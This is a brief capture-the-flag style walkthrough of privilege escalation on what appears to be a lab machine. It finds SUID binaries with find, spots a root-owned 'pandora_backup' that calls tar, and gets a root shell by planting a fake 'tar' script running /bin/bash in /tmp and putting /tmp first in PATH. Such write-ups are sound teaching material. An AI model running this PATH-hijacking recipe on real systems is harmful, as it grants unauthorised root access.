We search for SUID bits with

`find / -user root -perm /4000 2>/dev/null`

We find that there is a sus file: `/usr/bin/pandora_backup`

Can't analyze with `strings` so I wget it from attacker machine

I find that it is using `tar` to backup files

We are also able to overwrite $PATHS

We can just create a new `tar` in the `/tmp` directory

```
cd /tmp
echo "/bin/bash" > tar
chmod 777 tar
echo $PATH
export PATH=/tmp:$PATH
```

Run the `pandora_backup` utility again and we have root
